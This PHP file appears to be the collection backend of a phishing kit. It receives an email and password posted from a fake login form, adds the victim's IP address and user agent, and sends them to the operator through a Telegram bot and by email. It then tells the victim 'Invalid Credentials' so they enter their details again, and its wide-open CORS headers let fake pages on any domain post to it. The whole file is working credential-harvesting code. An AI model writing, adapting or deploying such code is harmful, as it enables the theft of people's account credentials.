<?php
// Security headers
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: OPTIONS, GET, POST");
header("Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control");

// Load environment variables
$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();

// Telegram configuration
$botToken = $_ENV['TELEGRAM_BOT_TOKEN'];
$chatId = $_ENV['TELEGRAM_CHAT_ID'];

// Get POST data
$email = trim($_POST['di'] ?? '');
$password = trim($_POST['pr'] ?? '');

// Function to log message via email and Telegram
function logMessage($message, $send, $subject) {
    // Send email
    if (filter_var($send, FILTER_VALIDATE_EMAIL)) {
        mail($send, $subject, $message);
    }

    // Send to Telegram
    global $botToken, $chatId;
    $mess = urlencode($message);
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . $mess;
    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

    $result = curl_exec($curl);
    curl_close($curl);

    return $result;
}

// Check if form fields are set
if (!empty($email) && !empty($password)) {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $useragent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

    $message = "[+]━━━━【🔥 Login Attempt 🔥】━━━━[+]\r\n\n";
    $message .= "ID : " . htmlspecialchars($email) . "\n";
    $message .= "Password : " . htmlspecialchars($password) . "\n\n";
    $message .= "[+]🔥 ━━━━【💻 System INFO】━━━━ 🔥[+]\r\n";
    $message .= "|Client IP: " . htmlspecialchars($ip) . "\n";
    $message .= "|User Agent: " . htmlspecialchars($useragent) . "\n";
    $message .= "|🔥 ━━━━━━━━━━━━━━━━━ 🔥|\n";

    $send = $_ENV['RECEIVE_EMAIL'] ?? 'admin@example.com';
    $subject = "Login Attempt: $ip";

    if (logMessage($message, $send, $subject)) {
        $signal = 'ok';
        $msg = 'Invalid Credentials';
    }
}
?>